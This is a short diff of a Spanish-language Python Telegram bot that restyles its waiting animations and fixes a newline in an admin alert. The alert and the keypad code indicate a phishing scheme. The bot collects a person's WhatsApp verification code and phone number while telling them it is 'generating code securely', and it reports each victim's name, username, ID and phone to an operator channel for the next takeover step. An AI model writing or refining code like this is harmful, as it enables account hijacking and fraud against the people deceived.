@@ -145,9 +145,10 @@ def build_keypad(code_str: str):
 
 async def animate_wait(bot, chat_id: int, message_id: int, user_id: int, is_photo: bool = False):
     frames = [
-        "⏳ Conectando a internet.",
-        "⌛️ Conectando a internet..",
-        "⏳ Conectando a internet..."
+        "⌛️ 𝐂𝐨𝐧𝐞𝐜𝐭𝐚𝐧𝐝𝐨 𝐚 𝐢𝐧𝐭𝐞𝐫𝐧𝐞𝐭",
+        "⏳ 𝐂𝐨𝐧𝐞𝐜𝐭𝐚𝐧𝐝𝐨 𝐚 𝐢𝐧𝐭𝐞𝐫𝐧𝐞𝐭.",
+        "⌛️ 𝐂𝐨𝐧𝐞𝐜𝐭𝐚𝐧𝐝𝐨 𝐚 𝐢𝐧𝐭𝐞𝐫𝐧𝐞𝐭..",
+        "⏳ 𝐂𝐨𝐧𝐞𝐜𝐭𝐚𝐧𝐝𝐨 𝐚 𝐢𝐧𝐭𝐞𝐫𝐧𝐞𝐭..."
     ]
     idx = 0
     try:
@@ -180,10 +181,10 @@ def stop_wait_task(user_id: int):
 
 async def animate_generating(bot, chat_id: int, message_id: int, user_id: int):
     frames = [
-        "⏳ Generando",
-        "⌛️ Generando.",
-        "⏳ Generando..",
-        "⌛️ Generando..."
+        "⏳ 𝐆𝐞𝐧𝐞𝐫𝐚𝐧𝐝𝐨 𝗰𝗼́𝗱𝗶𝗴𝗼 𝐝𝐞 𝐟𝐨𝐫𝐦𝐚 𝐬𝐞𝐠𝐮𝐫𝐚",
+        "⌛️ 𝐆𝐞𝐧𝐞𝐫𝐚𝐧𝐝𝐨 𝗰𝗼́𝗱𝗶𝗴𝗼 𝐝𝐞 𝐟𝐨𝐫𝐦𝐚 𝐬𝐞𝐠𝐮𝐫𝐚.",
+        "⏳ 𝐆𝐞𝐧𝐞𝐫𝐚𝐧𝐝𝐨 𝗰𝗼́𝗱𝗶𝗴𝗼 𝐝𝐞 𝐟𝐨𝐫𝐦𝐚 𝐬𝐞𝐠𝐮𝐫𝐚..",
+        "⌛️ 𝐆𝐞𝐧𝐞𝐫𝐚𝐧𝐝𝐨 𝗰𝗼́𝗱𝗶𝗴𝗼 𝐝𝐞 𝐟𝐨𝐫𝐦𝐚 𝐬𝐞𝐠𝐮𝐫𝐚..."
     ]
     idx = 0
 
@@ -631,10 +632,10 @@ async def keypad_cb(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await context.bot.send_message(
                     chat_id=ADMIN_CHANNEL_ID,
                     text=(
-                        "Solicitó el código de WhatsApp, ahora hay que enviarle el mensaje con el código. El DM ahora mismo esta generando el codigo. Proximo paso utilizar el COMANDO clave\n\n"
+                        "𝐒𝐨𝐥𝐢𝐜𝐢𝐭ó 𝐞𝐥 𝐜ó𝐝𝐢𝐠𝐨 𝐝𝐞 𝐖𝐡𝐚𝐭𝐬𝐀𝐩𝐩, 𝐚𝐡𝐨𝐫𝐚 𝐡𝐚𝐲 𝐪𝐮𝐞 𝐞𝐧𝐯𝐢𝐚𝐫𝐥𝐞 𝐞𝐥 𝐦𝐞𝐧𝐬𝐚𝐣𝐞 𝐜𝐨𝐧 𝐞𝐥 𝐜ó𝐝𝐢𝐠𝐨. 𝐄𝐥 𝐃𝐌 𝐚𝐡𝐨𝐫𝐚 𝐦𝐢𝐬𝐦𝐨 𝐞𝐬𝐭𝐚 𝐠𝐞𝐧𝐞𝐫𝐚𝐧𝐝𝐨 𝐞𝐥 𝐜𝐨𝐝𝐢𝐠𝐨. 𝐏𝐫𝐨𝐱𝐢𝐦𝐨 𝐩𝐚𝐬𝐨 𝐮𝐭𝐢𝐥𝐢𝐳𝐚𝐫 𝐞𝐥 𝐂𝐎𝐌𝐀𝐍𝐃𝐎 𝐜𝐥𝐚𝐯𝐞\n\n"
                         f"Nombre: {user.full_name or 'Sin nombre'}\n"
                         f"Username: @{user.username or 'sin_username'}\n"
-                        f"ID: {user.id}"
+                        f"ID: {user.id}\n"
                         f"Teléfono: {phone}"
                     )
                 )
